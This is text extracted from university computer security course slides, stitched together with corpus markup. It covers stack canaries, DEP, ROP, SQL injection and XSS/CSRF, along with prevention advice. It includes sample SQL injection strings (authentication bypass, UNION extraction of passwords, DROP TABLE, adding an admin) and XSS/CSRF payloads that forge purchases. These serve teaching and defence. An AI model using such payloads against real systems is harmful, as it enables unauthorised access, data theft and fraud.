b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A’, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]
ESP

51
Stack Canary
51
High Address

Low Address
…
EBP
ESP
Param2
Param1
Return Address
b[64] = [‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, CANARY
‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘, ‘A’, ‘A’, ‘A’, ‘A’, ‘A’, ‘A‘]
CANARY
Old EBP

52
Stack Canary
Canary types:
Random Canary – simple, compiler choose sequence of bytes randomly.
XOR Canary
Terminator Canary – Randomly chosen, but contains a terminator character.

What is the advantage of a Terminator Canary? 
52

53
DEP
DEP – Data Execution Prevention
The name given to executable space protection in Windows.
Other OSs have other implementation, but with the same idea.
Prevents the execution of code from certain regions on the memory.


53

54
DEP
Before DEP – code could be ran from any region in memory.
An attacker, which successfully performed BOF, can refer to a return address in the Data section, or even on the stack itself, and write the code there.

54

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region
Stack

Attacker inject malicious payload here
Then overrides return address to this address
Attacker inject malicious payload here
Then overrides return address to this address

55
DEP
After DEP – execution is allowed only from text section, which the attacker has no write access to.

55

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region
Stack

No code execution is allowed
Execution is allowed
No code execution is allowed

56
ROP
RETURN ORIENTED PROGRAMMING
56

57
ROP
57

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region
Stack


What is this?

58
ROP
58

0x0
Text Segment
Data Segment
BSS Segment
Heap

0xFFFFFFFF
Kernel Space
0xC0000000
Memory Mapping region
Stack


Loading of dynamic libraries (dlls)

59
ROP - DLLs
Dynamic Libraries are loaded at program startup by the linker.
DLLs are libraries of code to interact with the operation system.
Almost every program uses dynamic linking to certain DLL files such as Kernel32.dll
59

60
ROP - Gadgets
DLLs contain many functions, and therefore many RETURN operations.
Before the RETURN operation, there are one or two other operations.
Each set of operations + RETURN is a Gadget.
It is shown, that with many common DLLs it is possible to create a Turing complete language using only its Gadgets.
60

61
ROP – How does it look?
61
High Address

Low Address
…
EBP
ESP
Param1 to Gadget-n
Address of Gadget-n
Param1 to Gadget-2
Address of Gadget-2
Param1 to Gadget-1
Address of Gadget-1
Param2 to Gadget-1
.
.
.

62


61
Practice Question
Would changing the stack from growing down to growing up prevent buffer overflows?
Explain your answer
62

63
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-8---SQL-Injection\PS-9---SQL-Injection.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Practice Question
Would changing the stack from growing down to growing up prevent buffer overflows?
Explain your answer
1

2
Buffer Overflow
2
Low Address

High Address
EBP
ESP
Void func1() {
      char[] b[64];
      gets(b);
}
Void main() {
      // Start of application
      func1();
}

3
Buffer Overflow
3
Low Address

High Address
EBP
ESP
Return Address
Void func1() {
      char[] b[64];
      gets(b);
}
Void main() {
      // Start of application
      func1();
}

4
Buffer Overflow
4
Low Address

High Address
EBP
ESP
Return Address
Old EBP
Void func1() {
      char[] b[64];
      gets(b);
}
Void main() {
      // Start of application
      func1();
}

5
Buffer Overflow
5
Low Address

High Address
EBP
ESP
Return Address
Old EBP
b[64]
Void func1() {
      char[] b[64];
      gets(b);
}
Void main() {
      // Start of application
      func1();
}

6
Buffer Overflow
6
Void func1() {
      char[] b[64];
      gets(b);
}
Low Address

High Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}
Return Address
Old EBP
b[64]
Return Address
Old EBP

7
Buffer Overflow
7
Void func1() {
      char[] b[64];
      gets(b);
}
Low Address

High Address
EBP
ESP
Void main() {
      // Start of application
      func1();
}
Return Address
Old EBP



bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

8
Computer & Information Security
8
PRACTICAL SESSION NO. 9
SQL INJECTION


9
Agenda
SQL Recap
SQL Injection
Prevention and Protection
9

10
SQL Recap
10

11
SQL Recap
SQL – Structured Query Language
The standard language for accessing and manipulation (SQL) databases
An ANSI (American National Standards Institute) and ISO (International Organization for Standardization) standard – but different versions exist:
SQL Server
MySQL
SQLite
More…

An SQL database has tabular structure


11

12
SQL Syntax Recap
SELECT:
SELECT column1, column2, …
FROM table_name
WHERE condition

Selects and returns the desired columns from the specified table which satisfy the condition.
12

13
SQL Syntax Recap
INSERT:
INSERT INTO table_name (column1, column2, …)
VALUES (value1, value2, …)

Insert into specified table and columns (optional) the given values.
13

14
SQL Syntax Recap
DELETE:
DELETE FROM table_name
WHERE condition

Delete rows which satisfy the condition from specified table.
14

15
SQL Syntax Recap
DROP TABLE:
DROP TABLE table_name
DROP DATABASE:
DROP DATABASE database_name

Drops (Removes entire) tables from database or database from disk.
15

16
SQL Injection
HOW IS IT DONE
16

17
SQL Injection - Objectives
Three main attacker’s objectives for SQL injection:

Control application behavior based on data in the database.

Access data from the database without authorization.

Alter data in the database without authorization.
17

18
Reconnaissance
How does the attacker know how to attack?
What?
Database type
Database name
Tables names
Tables structures
Etc.
How?
Look at program’s / website’s code
Reverse Engineering
Send faulty queries and learn from returned error messages
Union based queries to extract information from the database
Response time attacks
18

19
SQL Injection - Vulnerability
The vulnerability begins when software needs to access the DB, but the query is depended on user’s input.
For Example:
Login into an account – user inputs details, query is built accordingly:
19
Maccabi
*****
“SELECT * 
FROM Users
WHERE username = ‘Maccabi’
AND password = ‘Haifa’;”
“SELECT * 
FROM Users
WHERE username = ‘“ + username + 
“’ AND password = ‘” + password + “’;”

20
Control Application Behavior
Bypass authentication mechanism:







All users are returned – usually system look at first result.

20
Someone’ OR 1=1; --
********
“SELECT * 
FROM Users
WHERE username = ‘Someone’
OR 1=1; -- AND password = ‘paswd’;”
“SELECT * 
FROM Users
WHERE username = ‘“ + username + 
“’ AND password = ‘” + password + “’;”

21
Control Application Behavior
Login as an administrator:








21
JonSnow’; INSERT INTO group_membership (user_id, group) 
VALUES ((SELECT id FROM users WHERE username='JonSnow‘), 'Administrator'); --
********
“SELECT * FROM Users
WHERE username = ‘JonSnow’; INSERT INTO group_membership (user_id, group) 
VALUES ((SELECT id FROM users WHERE username='JonSnow‘) ,'Administrator’);
-- AND password = ‘paswd’;”
“SELECT * 
FROM Users
WHERE username = ‘“ + username + 
“’ AND password = ‘” + password + “’;”

22
Access and Alter data 
In our website we show a product list and some details about them.
It is possible to filter the list by product name.
22

23
Access data 
Assumed filter query: “SELECT name, code, available, price, rating FROM Products WHERE name=‘” + filter + “’;”







Resulted query: “SELECT name, code, available, price, rating FROM Products WHERE name=‘Whatever’  UNION SELECT username, password, 0, 0, 0 FROM users WHERE ‘1’=‘1’;”
23
Whatever’  UNION SELECT username, password, 0, 0, 0 FROM users WHERE ‘1’=‘1

24
Alter data 
Assumed filter query: “SELECT name, code, available, price, rating FROM Products WHERE name=‘” + filter + “’;”







Resulted query: “SELECT name, code, available, price, rating FROM Products WHERE name=‘Whatever’;  DROP TABLE customers; --’;”
24
Whatever’;  DROP TABLE customers; --

25






Prevention
HOW DO WE PREVENT OR BLOCK SQL ATTACKS
25

26
Obfuscation
First of all – take measures against reconnaissance:

Move implementation (especially DB related) to back-end

Harden reverse engineering by obfuscation techniques

Do not reveal errors to users – alert for an error with no further details

26

27
Reduce Attack Surface
Ensure that all excess database privileges are revoked and that only those routines that are intended for end-user access are exposed. 
Though this does not entirely eliminate SQL injection vulnerabilities, it mitigates the impact of the attacks.
27

28
Avoid Dynamic SQL Queries
Dynamic SQL built with concatenated input values presents the easiest entry point for SQL injections. 
Avoid constructing dynamic SQL this way.
28

29
Use Bind Arguments
Parameterize queries by using bind arguments. 
Bind arguments reduce the possibility of SQL injections and enhance performance.





Examples for many different programming languages:
http://bobby-tables.com/

29

30
Filter and Sanitize Input
If all of the above is impossible or in addition – check input for attacker’s possible inputs.
Though this will not block all attacks, it will make the attacks harder to perform, yet sophisticated attackers will eventually find their way in.

For example:
Check for occurrences of 1=1 or in general something=something.
Sophisticated attacker will perform: 2=1+1.
30

31
Test your Website/Application
Many engines exist for testing websites and application for SQL injection vulnerabilities:
Checkmarx
Qualys
Acunetix
Etc.

31

32
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\תרגולים\תרגול-9---Web-Application-Security\PS-10---Web-Application-Security.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security
1
PRACTICAL SESSION NO. 10
WEB APPLICATION SECURITY


2
Agenda
Web Application Security Introduction
XSS
Persistent XSS
Reflected XSS
CSRF
Prevention and Protection
2

3
Web Application Security Introduction
3

4
What is Web Application Security
A branch of Information Security
Deals with:
Websites (e.g. – Google)
Web Applications (e.g. – Google Calendar) 
Web Services (e.g. – Google maps API)
4

5
Web Application Threats
Threats concerning application security:
Cross-Site Scripting (XSS)
Cross-Site Request Forgery (CSRF)
SQL Injection
Buffer Overflows
Session management flaws
Parameter tampering
Denial of Service
Insecure communication
Access control flaws
And more…
5

6
Web Application Players
Who are the players in the field of Web Application Security?
Attacker
Performs the attack on the owner’s website.
Expect certain value from the attack.
Anyone with the proper knowledge.
Owner
Owner of the website which is being attacked.
Might not suffer from the actual payload.
Suffers from loss of public image, customer trust, money…
Anyone who runs a website, web application or a web service.
Customer
A user that uses the website that was attacked, thus becoming target.
Mainly suffers from the actual payload.
Anyone who uses the attacked website.
6

7
Reconnaissance
How does the attacker know how to attack?
What?
DOM structure
Parameters to URLs
Flow of execution
Etc.
How?
Look at website’s code
Just look around the site
Trial and error
7

8
XSS
CROSS SITE SCRIPTING
8

9
XSS
Cross-Site Scripting (XSS) attacks occur when:

Data enters a Web through an untrusted source, most frequently a web request.

The data is included in dynamic content that is sent to a web user without being validated for malicious content.

9

10
Stored XSS
Stored attacks are those where the injected script is permanently stored on the target servers.
The victim then retrieves the malicious script from the server when it requests the stored information.
10

11
Stored XSS
Example:









JS Malicious code examples: https://aw-snap.info/articles/js-examples.php 
11
הודלף: פתרון מבחן "אבטחת מחשבים ורשתות תקשורת" 2019
<script>
	alert(“Bazinga!”);
</script>

12
Reflected XSS
Injected script is reflected off the web server (e.g. error message, search result).
Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site.
When a user is tricked into clicking on a malicious link, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser.
The browser then executes the code because it came from a "trusted" server.
12

13



Reflected XSS
Example
13
https://www.google.co.il/search?noj=1&q=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&oq

14
CSRF
CROSS SITE REQUEST FORGERY
14

15
CSRF
Forces the end user to execute unwanted actions on a web application in which they're currently authenticated.
CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.
With a little help of social engineering, an attacker may trick the users of a web application into executing actions of the attacker's choosing.
15

16
Stored
Example:
16
הודלף: צילום מבחן "אבטחת מחשבים ורשתות תקשורת"  2019
Picture of the upcoming test in Information Security (2019):
<img src=“InformationSecurity2019_Page1.jpg”>
<img src="www.amazon.com/?ItemId=22&Action=buy&Amount=4”>

Refresh if images are not shown

17
Prompt By-Pass CSRF
The example given before will not work in a web store that asks for further confirmation.
When additional actions are needed from the user to perform the actual transaction, a sequence of actions can be injected by the attacker.
17

18
Prompt By-Pass XSS
Example:
18
Picture of the upcoming test in Information Security (2019):
<script>
function confirm() {
	var img = getElementById(“secondPage”);
	img.src = "www.amazon.com/?ItemId=22&Action=confirm&Amount=4”
}
</script>
<img src="InformationSecurity2019_Page1.jpg“ id=“firstPage”>
<img src="www.amazon.com/?ItemId=22&Action=buy&Amount=4” id=“secondPage”
onerror=“confirm()”>

Refresh if images are not shown
הודלף: צילום מבחן "אבטחת מחשבים ורשתות תקשורת"  2019

19
Prevention and Protection

19

20
Defending and Protecting Web Applications
20
Never trust client-side data, filter it before.
Prevent user input from being interpreted in a dangerous context by escaping. (e.g. - < is &lt;).
Search for <script> (ASP.net)
Etc.

21
 
</TEXT>
</DOC>
